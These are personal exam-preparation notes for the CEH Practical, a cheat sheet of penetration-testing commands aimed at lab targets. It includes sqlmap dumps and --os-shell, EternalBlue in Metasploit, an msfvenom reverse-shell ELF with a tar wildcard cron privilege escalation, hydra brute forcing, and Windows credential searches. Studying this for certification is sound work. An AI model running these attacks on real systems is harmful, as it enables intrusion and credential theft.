====================NOTES FOR CEH PRACTICAL EXAM======================

https://chatgpt.com/c/69cd0b62-5134-8320-a165-3d744793ca6f


https://github.com/rebootuser/LinEnum (1:-chmod +x LinEnum.sh         2:- ./LinEnum.sh -t -r results.txt -e /tmp/)

https://github.com/peass-ng/PEASS-ng.git (1:-chmod +x linpeas.sh , 2:- ./linpeas.sh -a > /tmp/linpeas_report.txt)

also check it has share folder on it (CEH-Tools(\\WINDOWS11)(Z:)


1. Nmap✅
2. Hydra✅
3. Sqlmap✅
4. John✅
5. Hashcat✅
6. Metasploit✅
7. Wireshark✅
8. Steghide✅
9. OpenStego✅
10. Snow✅
11. Veracrypt✅
12. Hashcalc
13. OWASP ZAP✅
14. OpenVAS✅
15. CrypTool✅            
16. Burpsuite✅
17. BCTextEncoder✅
18.netcat✅



================ 19. IMPORTANT PORTS =================

21 → FTP
22 → SSH
80 → HTTP
443 → HTTPS
139 → NetBIOS
445 → SMB
3389 → RDP
53 → DNS

--------------------------------------------------




@Phase 1 :
Do these first:

Entry point (file analysis)
FQDN (LDAP)
WiFi cracking (.cap)
Hash cracking (MD5/SHA)
Stego extraction
Simple file reads (DVWA/upload paths)

@Phase 2 :
Web exploitation (SQLi / flags)
SMB / FTP brute + file access
PCAP analysis (Wireshark stats)
Android/ADB extraction

@Phase 3 :
Privilege escalation
Complex web chains
RAT access / pivoting


Always return only what is asked:

Entry point → 0xXXXXXXXX
FQDN → dc01.domain.local
Password → just password
Flag → exact string

❌ No explanation
❌ No extra text





=======grep,find=========

@ Sudo find / - name "metasploit" (to find file)
@ grep "fuckU" secret.txt (to find anything within the file









1. Nmap✅ :-

sudo netdiscover -r 198.168.56.0/24
@ Nmap -PR -sn 192.168.1.0/24 ( just to find live hots -sn ignore the ports and -PR is used for ARP ping scan)


nmap -sV -O -p- -T4 -oX oXscan.txt certifiedhacker.com
xsltproc /usr/share/nmap/nmap.xsl oXscan.txt -o report.html (and open the report file in browser)


nmap -sV -O -p- -T4 -oN scan.txt target_or_subnet

nmap -sV --script vuln -sC -O -p 1-1000 10.49.152.197



nmap -p 389 --script ldap-rootdse target_ip (for domain controller/name question)



@ Nmap -sC -sV -O -p- -T4 -v 192.168.1.0/24
@nmap -sP (used for host discovery without doing port scan)


sudo nmap -O 192.168.1.0/24 | grep -B4 "Windows" (OS detection + grep)
sudo nmap --script os-detection 192.168.1.0/24 | grep "Windows"
sudo nmap -O -p 3389 192.168.1.0/24 | grep -B4 "Windows" (Scan for Windows hosts with a specific port open)




2\. Hydra✅ :- Hydra -l james -P given\_password\_wordlist ftp://target
               hydra -L usernames.txt -P pass.txt mysql://127.0.0.1



3\. Sqlmap✅ :-

inspect==>consoles==>then search ==>document.cookie

@@@approach one :-

sqlmap -u http://testphp.vulnweb.com/ --crawl 2-batch --threads 5

sqlmap -u http://testphp.vulnweb.com/ --crawl 3--tamper-base64encode --batch

sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --proxy="127.0.0.1:4444"

sqlmap -u http://testphp.vulnweb.com/login.php --forms



sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1\&Submit=Submit" \\ --cookie="PHPSESSID=cdlnvhnrnjd3fhmcgdugf8thm0; security=low" \\ --dbs --batch (/sqli/?id=1\&Submit=Submit  add this and cookie and you good to go)

sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1\&Submit=Submit" \\ --cookie="PHPSESSID=cdlnvhnrnjd3fhmcgdugf8thm0; security=low" \\ -D dvwa --tables --batch

sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1\&Submit=Submit" \\ --cookie="PHPSESSID=cdlnvhnrnjd3fhmcgdugf8thm0; security=low" \\ -D dvwa -T users --dump

1\. Unauthenticated Targets

• 	If the vulnerable page is public (no login required), you don’t need cookies at all.

• 	Example: sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs --batch



2\. POST Data Instead of Cookies

• 	Some apps don’t use cookies but rely on POST parameters (like login forms).

• 	You can pass POST data directly: sqlmap -u "http://target.com/login.php" --data="username=admin\&password=123" --dbs



@@approach two:=



#List databases, add cookie values
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
  OR
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  


# List Tables, add databse name
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
  
# List Columns of that table
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
  
#Dump all values of the table
sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
  

sqlmap -u "http:domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --os-shell
 













4\. John✅ :- # Crack SHA1 hash with John

 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

john hashfile.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1



\# Show cracked password(s)

(format optional if John auto-detects correctly)



john --show hashfile.hash









5\. Hashcat✅ :- # Hash Identification \& Cracking Cheat Sheet



\## Hash Identification.com/en/decrypt/hash

\- CLI tool:

&#x20; hash-identifier   # Python CLI to detect hash type



\## Hash Cracking

\- Online cracking:

&#x20; https://crackstation.net/

&#x20; https://hashes.com/en/decrypt/hash



\- Hashcat usage:

&#x20; hashcat -a 3 -m <mode> hash.txt /path/to/rockyou.txt --show



&#x20; -a  Attack mode

&#x20;    0 = Dictionary

&#x20;    3 = Brute force

&#x20;    6 = Hybrid dict+mask

&#x20;    7 = Hybrid mask+dict



&#x20; -m  Hash type (mode)



\## Common Hashcat Modes

&#x20; 0    = MD5

&#x20; 100  = SHA1

&#x20; 110  = SHA1 + Salt

&#x20; 900  = MD4

&#x20; 1000 = NTLM

&#x20; 1400 = SHA256

&#x20; 1800 = SHA512CRYPT

&#x20; 3200 = bcrypt

&#x20; 160  = HMAC-SHA1



\## Advanced Tips

\- Wordlists: /rockyou.txt, custom dicts

\- Rules: -r rules/best64.rule

\- Benchmark GPU: hashcat -b

\- Check devices: hashcat -I

\- Salted hashes: include salt properly











6\. Metasploit✅ :-
get reverse shell that's the task
# 1. Launch Metasploit

msfconsole

# 2. Exploit target (example: EternalBlue)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set LHOST <your_ip>
set LPORT <your_port>
exploit

# 3. Background the shell session
background

# 4. Upgrade shell to Meterpreter
sessions -u <session_id>

# 5. Interact with Meterpreter
sessions -i <new_session_id>

# 6. List running processes
ps

# 7. Choose a stable process (e.g., explorer.exe)
# Write down the PROCESS_ID

# 8. Migrate into that process
migrate <PROCESS_ID>

# 9. Verify migration
getpid
getuid
sysinfo








7. Wireshark✅ :-


To find DOS (SYN and ACK) : tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
To find passwords : http.request.method == POST

for DOS QUESTION :

1: open the file in wireshark
2: upper side go to statistics and then conversestions then IPv4 and then under that select packets and select ip address that has highest packets.

================ WIRESHARK MASTER CHEATSHEET =================

================ 1. QUICK ATTACK DETECTION =================

DoS (SYN Flood) → tcp.flags.syn == 1 and tcp.flags.ack == 0
ACK Flood → tcp.flags.ack == 1
Password Capture (HTTP POST) → http.request.method == POST

--------------------------------------------------

================ 2. COMMON FILTERS =================

http.request.method == POST   → Find HTTP POST requests
smtp                          → Email traffic
pop                           → POP3 email traffic
tcp                           → Show TCP packets
dns.qry.type == 1             → DNS queries
dns.flags.response == 0       → Unique DNS queries

--------------------------------------------------

================ 3. PACKET SEARCH =================

Edit > Find Packet > Packet Bytes > Case Sensitive: "pass"

--------------------------------------------------

================ 4. DDOS ANALYSIS =================

Step 1 → Look at packet count (first column)
Step 2 → Statistics > IPv4 Statistics > Destination and Ports

--------------------------------------------------

================ 5. TSHARK CLI =================

tshark -r dns.cap | wc -l
tshark -r dns.cap -Y "dns.qry.type == 1" -T fields -e dns.qry.name
tshark -r dnsexfil.pcap -Y "dns.flags.response == 0" | wc -l
tshark -r pcap -T fields -e dns.qry.name | uniq | wc -l
tshark -r pcap | head -n2
tshark -r pcap -Y "dns.flags.response == 0" -T fields -e "dns.qry.name" | sed "s/.m4lwhere.org//g" | tr -d "\n"

--------------------------------------------------

================ 6. FINAL TIPS =================




8 . Steghide✅ :-

&#x20; 

1 :- Hide a text file inside an image

steghide embed -cf cover.jpg -ef secret.txt -sf output.jpg





2 :- Extract hidden text from the image

steghide extract -sf output.jpg -xf recovered.txt



3 :- Text Files (SNOW)



• Hide text inside whitespace



stegsnow -C -m "Hidden message" -p password secret.txt > stego.txt

stegsnow -C -p password stego.txt



(hashes.com or crackstation to crack the hash)






9\. OpenStego✅ :- sudo dpkg -i openstego-0.8.6-1\_all.deb (go to site and download tool and then install it through this) use openstego or search it tools folder its already provided 






10\. Snow✅ :- Snow.exe -C -p “given\_password” file\_name

&#x20;             snow -C -p "magic" readme2.txt

&#x20;              #-p = password #






11. Veracrypt✅ :- download VeraCrypt tool on internet then run exe file and then you can make a hidden partions and mount/unmount it using this tool.

12\. Hashcalc✅ :-done 
13. OWASP ZAP✅:-done



14\. OpenVAS✅ :-

OpenVAS tool:-

conduct a vulnerability analysis using the OpenVAS tool on a Parrot Security

under:- pentesting ==> vlunerblity analysis ==> OpenVAS.geenbone ==> Start greenbone vlunerblity manager service

after tool start open the provided link browser

login as user:- admin , password:- password

then go to scans ==> tasks , then on left 🪄 task wizard button Enter ip address of target & complete the scan
click on status ==> done button ==> result tab (note if result not found try disabling firewall on target machine)




15\. CrypTool✅ :- download Cryptool tool on internet then run exe file and then you can encrypt/decrypt files.



16\. Burpsuite✅ :-done



17\. BCTextEncoder✅ :-

&#x20;just copy the text include below text and paste it into BCTextEncoder put password and click decode simple !!



BEGIN ENCODED MESSAGE



Version: BCTextEncoder Utility v. 1.03.2.1



wy4ECQMChSp+KkyJYPtghFl1kls5PloS27RrysV1JdXAZ8sFctgHldXCkuxO0lml OmUByGIsQ1V7DaloZaJXV38AJwww2BgqjMoMp3OEHo57KN7JaHeirbiwkhIqofVI OWZIBBUZ1 HuA6745zZqJoomKS96N9z/wtLQstZjgHsag3tr8aMAPCDdFJm99c0wQ



BmPGj/WOKQ===D4cp



END ENCODED MESSAGE


18.netcat✅ :-

On Kali (receiver): nc -lvp 4444 > hash.txt

On Debian (sender): cat hash.txt | nc <KALI_IP> 4444



==============runs on kali/ubantu to share files =====================



 ##start on senders machine ## python3 -m http.server 8000

##run this on recivers machine ## wget http://<senders-ip>:8000/<filename>

##run this on recivers machine ## curl -O http://192.168.136.29:8000/reverse.msi

##run this on to get reverseshell ##  sudo nc -nvlp 53 (first run this the exploit)

##to share files from RDP windows to kali file share run this two commands **use sudo if error occured** ## (run it on kali ) :-"sudo systemctl start ssh
sudo systemctl enable ssh" 

(then set the path and run this command on windows) :- "scp C:\Windows\Repair\SYSTEM kali@192.168.136.29:/home/kali/expriments/"

##to stop ssh service## sudo systemctl stop ssh


===========================i think there is question related this find ==========================================

View the contents of the other cron job script:

cat /usr/local/bin/compress.sh

Note that the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for tar(opens in new tab). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

chmod +x /home/user/shell.elf

Create these two files in /home/user:

touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf

When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

nc -nvlp 4444

==========================================================================================


:: =========================
:: 1. Basic Enumeration
:: =========================
whoami /priv
whoami /groups
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
net user
net localgroup administrators
tasklist /svc

:: =========================
:: 2. File & Directory Listing
:: =========================
dir C:\Windows
dir C:\Users
dir /s /b C:\ | findstr flag
dir /s /b C:\ | findstr password
dir /s /b C:\ | findstr admin

:: =========================
:: 3. Read File Contents
:: =========================
type C:\Windows\flag1.txt
more C:\Users\Public\flag2.txt
type "C:\path\to\interesting.txt"

:: =========================
:: 4. Search / Find Sensitive Data
:: =========================
findstr /si password *.txt *.ini *.xml
findstr /si admin *.config *.xml
findstr /si flag *.txt *.log
reg query HKLM /f password /t REG_SZ /s

:: =========================
:: 5. Service & Registry Checks
:: =========================
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"
reg query HKLM\System\CurrentControlSet\Services
sc qc <ServiceName>   :: Query service config
sc queryex type= service state= all

:: =========================
:: 6. Privilege Escalation Vectors
:: =========================
:: AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: Scheduled Tasks
schtasks /query /fo LIST /v

:: Check PATH for writable folders
echo %PATH%

:: =========================
:: 7. Useful Tools (if available)
:: =========================
:: AccessChk.exe - check permissions
:: WinPEAS.exe   - automated checks
:: Seatbelt.exe  - security configs
:: Mimikatz.exe  - credential extraction (lab use only)

:: =========================
:: 8. Meterpreter Specific (if upgraded)
:: =========================
ps
migrate <PID>
getuid
sysinfo
search -f flag*.txt
download C:\\Windows\\flag1.txt
search -f reverse.exe


=========================================CEH PRACTICAL MASTER CHEAT SHEET=============================================


==============================
CEH PRACTICAL MASTER CHEAT SHEET
================================

---

1. ENTRY POINT (MALWARE)

---

Tool: CFF Explorer / PEview
Path:
NT Headers → Optional Header
Find:
AddressOfEntryPoint

Answer:
0xXXXXXXXX

---

2. FQDN OF DOMAIN CONTROLLER

---

nmap -p 389 --script ldap-rootdse target

Find:
dnsHostName

Answer:
dc01.domain.local

---

3. ANDROID ELF + SHA384 (ENTROPY)

---

Step 1:
adb connect target_ip

Step 2:
adb shell
cd /sdcard/Scan
adb pull *

Step 3:
ent file.elf

Find:
Highest entropy value

Step 4:
sha384sum file

Answer:
Last 4 digits of hash

---

4. PRIVILEGE ESCALATION (ROOT)

---

ssh smith@target
password: L1nux123

Commands:
whoami
sudo -l
find / -perm -4000 2>/dev/null

After root:
cat imroot.txt

Answer:
file content

---

5. ENTRY POINT (SECOND FILE)

---

Same as Q1

---

6. WEB EXPLOIT (page_id=84)

---

Use:
Burp Suite / Manual SQLi

Test:
' OR 1=1 --

Or:
sqlmap -u "http://target/page?page_id=84" --dbs

Answer:
flag value

---

7. WEB EXPLOIT (Flag.txt)

---

Scan:
nikto -h target

Dir brute:
gobuster dir -u http://target -w common.txt

Exploit:
upload / LFI / RCE

Find:
Flag.txt

---

8. DVWA HASH CRACK

---

Access:
http://target/DVWA

Upload path:
C:\wamp64\www\DVWA\hackable\uploads\

Crack:
john hash.txt
OR
echo hash | md5sum lookup

Answer:
original text

---

9. RAT ACCESS (sa_code.txt)

---

Use:
netcat / metasploit

nc target port

Navigate:
find file

Answer:
file content

---

10. WAMP SERVER IP

---

nmap -p 80,8080 subnet

Look for:
Apache + PHP + WAMP

Answer:
IP address

---

11. SMB ENUM + CRACK

---

enum4linux -a target

hydra -l user -P rockyou.txt smb://target

Access:
smbclient //target/share

Decrypt file:
base64 -d / openssl

---

12. ANDROID DEVICE FIND

---

nmap -sn subnet

Look for:
Android / unknown vendor

Then ADB connect

---

13. VULNERABILITY SCAN

---

openvas / nikto

Find:
End-of-life software

Answer:
CVSS score

---

14. REMOTE LOGIN EXPLOIT

---

Check:
ssh / ftp / telnet

hydra brute

Login:
read file

---

15. STEGANOGRAPHY

---

steghide extract -sf image.jpg

Password: given

Answer:
hidden message

---

16. FTP WEAK CREDENTIALS

---

ftp target

Try:
anonymous

OR hydra brute

Find:
hidden file

---

17. PRIV ESC (AGAIN)

---

sudo -l
SUID
cron

---

18. PCAP DDOS ANALYSIS

---

wireshark

Filter:
ip

Statistics → Conversations

Find:
highest packet sender

Answer:
IP

---

19. SQL INJECTION (LOGIN)

---

Payload:
' OR '1'='1

OR sqlmap

Extract:
password

---

20. IOT PCAP ANALYSIS

---

Filter:
mqtt

Find:
publish packet

Answer:
length

---

21. WIFI CRACK

---

aircrack-ng file.cap -w rockyou.txt

Answer:
password

---

22. VERACRYPT DECRYPT

---

veracrypt volume

Mount with password

Open file

---

23. BASE64 / HASH / DECODE

---

echo text | base64 -d

hashid
john

---

## MASTER MEMORY LINE

scan → enum → exploit → privesc → extract answer

---

## TOP 5 TOOLS TO MASTER

nmap
sqlmap
hydra
john
wireshark

---

## GOLDEN RULE

Answer EXACT value only
(no explanation)
================

===================================================END OF MASTER SHEET========================================================================


Enumerate hidden directories on the web server.

gobuster dir -u http://192.168.1.43/ -w /usr/share/wordlists/dirb/common.txt 

# Gobuster Enumeration
# Directory brute force
gobuster dir -u http://<target> -w /path/to/wordlist.txt

# Virtual host brute force
gobuster vhost -u http://<target> -w /path/to/wordlist.txt

# DNS subdomain brute force
gobuster dns -d <domain> -w /path/to/wordlist.txt

# Common options
  -t 50        # Threads (speed)
  -x php,txt   # File extensions
  -o results.txt  # Output to file

# Example
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50 -o gobuster.txt


# Nikto Enumeration
# Basic scan
nikto -h http://<target>

# Scan with SSL
nikto -h https://<target>

# Specify port
nikto -h <target> -p 8080

# Output results
nikto -h http://<target> -o nikto.txt

# Example
nikto -h http://10.10.10.10 -p 80 -o nikto.txt


